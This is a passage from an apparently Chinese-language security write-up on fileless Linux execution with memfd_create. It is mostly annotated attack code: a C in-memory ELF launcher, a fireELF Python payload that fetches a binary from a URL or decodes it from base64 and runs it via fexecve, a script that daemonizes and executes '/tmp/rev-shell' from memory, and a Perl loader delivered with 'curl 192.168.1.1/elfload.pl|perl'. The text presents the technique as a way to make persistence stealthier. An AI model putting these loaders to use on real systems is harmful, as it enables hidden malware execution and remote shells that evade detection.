    waitpid(child, NULL, 0);
    lseek(fd, 0, SEEK_SET);
    // 再将fd内获取到的执行输出重新拷贝出来
    br = read(fd, buf, BUFSIZ);
    if (br == -1)
    {
        perror("read");
        exit(EXIT_FAILURE);
    }
    buf[br] = 0;
    printf("child said: '%s'n", buf);
    exit(EXIT_SUCCESS);
}
```
### C语言版-2
#### 来源与参考
代码是由国内的安全厂商奇安信开源的一款工具，名叫ptrace，代码言简意赅基本上懂C的能直接看着猜出代码的意思，同样的网上也有不少分析。代码仓库地址如下:
https://github.com/QAX-A-Team/ptrace
#### 代码分析
```c
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int anonyexec(const char *path, char *argv[])
    {
        int   fd, fdm, filesize;
        void *elfbuf;
        char  cmdline[256];
        //打开旧文件，记录其大小、内容
        fd = open(path, O_RDONLY);
        filesize = lseek(fd, SEEK_SET, SEEK_END);
        lseek(fd, SEEK_SET, SEEK_SET);
        elfbuf = malloc(filesize);
        read(fd, elfbuf, filesize);
        close(fd);
        // 创建匿名文件
        fdm = syscall(__NR_memfd_create, "elf", MFD_CLOEXEC);
        ftruncate(fdm, filesize);
        // 将旧文件内容拷贝至匿名文件，获得副本
        write(fdm, elfbuf, filesize);
        free(elfbuf);
        //对匿名文件的运行，这里使用通过execve直接执行本进程的/proc/self/fd/[匿名文件句柄]进行
        sprintf(cmdline, "/proc/self/fd/%d", fdm);
        argv[0] = cmdline;
        execve(argv[0], argv, NULL);
        free(elfbuf);
        return -1;
    }
    int main()
    {
        char *argv[] = {"/bin/uname", "-a", NULL};
        int result =anonyexec("/bin/uname", argv);
        return result;
    }
```
### python版本-1
#### 来源与参考
这里给出一段使用python脚本完成memfd_create调用的例子，代码来自fireELF项目，具体的代码地址为：
https://github.com/rek7/fireELF/blob/master/payloads/simple.py
同样的，网上已有不少现成的代码讲解与分析。
```shell
https://www.cnblogs.com/lsgxeva/p/12956858.html
https://blog.csdn.net/Rong_Toa/article/details/109845832#t9
```
#### 代码分析
```python
import base64
desc = {"name" : "memfd_create", "description" : "Payload using memfd_create", "archs" : "all", "python_vers" : ">2.5"}
def main(is_url, url_or_payload):
    payload = '''import ctypes, os, urllib2, base64
libc = ctypes.CDLL(None)
argv = ctypes.pointer((ctypes.c_char_p * 0)(*[]))
syscall = libc.syscall
fexecve = libc.fexecve'''
    if is_url:
        payload += '\ncontent = urllib2.urlopen("{}").read()'.format(url_or_payload)
    else:
        encoded_payload = base64.b64encode(url_or_payload).decode()
        payload += '\ncontent = base64.b64decode("{}")'.format(encoded_payload)
    payload += '''\nfd = syscall(319, "", 1)
os.write(fd, content)
fexecve(fd, argv, argv)'''
    return payload
```
我们再进一步从上面代码中提取出核心代码：
```python
import ctypes, os, urllib2, base64
libc = ctypes.CDLL(None)
argv = ctypes.pointer((ctypes.c_char_p * 0)(*[]))
syscall = libc.syscall
fexecve = libc.fexecve
content = PAYLOAD_2_EXECUTE
# memfd_create的函数调用码是319
fd = syscall(319, "", 1)
os.write(fd, content)
fexecve(fd, argv, argv)
```
可以从上面的代码中发现，作者的想法是先通过syscall调用memfd_create创建匿名文件，再把句柄交给fexecve去执行，代码还是很精辟犀利的。
### python版-2
#### 来源与参考
下面这段无名代码是从网上一篇安全分析文章中看到的，代码的基本思路是从
https://www.anquanke.com/post/id/168791
#### 代码分析
```python
import ctypes
import os
# 读入待执行文件的内容
binary = open('/tmp/rev-shell','rb').read()
# 创建匿名文件
fd = ctypes.CDLL(None).syscall(319,"",1)
# 完成将待执行文件内容写入到匿名文件的复制
final_fd = open('/proc/self/fd/'+str(fd),'wb') 
final_fd.write(binary)
final_fd.close()
fork1 = os.fork() #create a child
if 0 != fork1: os._exit(0)
# 通过syscall的方式调用setsid()函数，再执行fork，猜测目的是用来将匿名文件的进程挂载到其他进程下。
ctypes.CDLL(None).syscall(112)
fork2 = os.fork()
if 0 != fork2: os._exit(0)
# 正式运行起来恶意匿名文件
os.execl('/proc/self/fd/'+str(fd),'argv0','argv1')
```
### perl版
#### 来源与分析
perl版的代码最早来源于@magisterquis，国内不少关于这篇代码的分析都抄自”逢魔安全实验室“的分析。
https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
实际上这份代码是目前最纯粹的无文件Linux攻击方案，代码非常之经典。
#### 代码分析
代码由三部分组成
**第一部分**
```shell
cat >> elfload.pl &='.$fd) or die "open: $!";
select((select($FH),$l=1)[0]);
# Load binary into anonymous file (i. e. into memory)
print "Writing ELF binary to memory...";
EOF
```
**第二部分**
```shell
perl -e '$/=\32;print"print \$FH pack q/H*/, q".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(<>)' elfdemo >> elfload.pl
```
**第三部分**
```shell
cat >> elfload.pl <<EOF
print "done\n";
# Execute new program
print "Here we go...\n";
exec {"/proc/$$/fd/$fd"} "formsec"
        or die "exec: $!";
```
**利用**
```shell
curl 192.168.1.1/elfload.pl|perl
```
### 优势与劣势
优势：memfd_create提供了一种创建不落地的匿名文件的方案，这极大的增强了持久化过程的的隐身性。
劣势：memfd_create只是提供了一种匿名文件创建方法，需要和其他技术结合起来一起使用比如通过fexecve调用memfd_create创建的匿名文件句柄。